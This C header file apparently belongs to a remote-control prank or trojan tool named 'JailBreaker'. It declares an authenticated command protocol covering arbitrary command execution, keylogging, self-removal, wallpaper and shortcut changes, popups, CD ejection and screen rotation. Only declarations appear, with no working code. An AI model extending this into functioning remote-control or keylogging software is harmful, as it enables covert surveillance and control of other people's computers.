#ifndef FUN
#define FUN

#include "../Main.h"

typedef enum {
    /* --- Templates --- */
    JB_FUN,
    JB_DEACTIVE,    // Deactive jailbraker
    JB_REMOVE,      // Delete from pc completely

    /* --- Sounds --- */
    JB_VOLUME,
    JB_SZAMBO, // pay sound

    /* --- Wallpaper --- */
    JB_SETWALL,
    JB_SAVEWALL,
    JB_LOADWALL,

    /* --- Shortcuts --- */
    JB_CREATELINKS,
    JB_REMOVELINKS,

    /* --- Other --- */
    JB_OPENWEB,     // Open website in default browser
    JB_CDEJECT,     // Eject disk drive
    JB_POPUPW,      // MessageBoxW
    JB_POPUPA,      // MessageBoxA
    JB_EXEC,        // execute a cmdlet
    JB_ROTATESCR,   // SetDisplayAutoRotationPreferences
    JB_CHANGERES,   
    JB_LOGKEYS      // keylogging bruh.   
} JB_Instruction;

typedef struct {
    char auth[AUTH_LENGTH];
    JB_Instruction cmd;     // JB_POPUP "Title¿"Polskie szamba liderem są w kraju"\0"
    char args[CMD_ARGSZ];
} JBCMD; // JailBreaker Command

//WINBOOL changeWallpaper(char *path);  // I think we don't need to expose it

void execCommand(JBCMD cmd);

#endif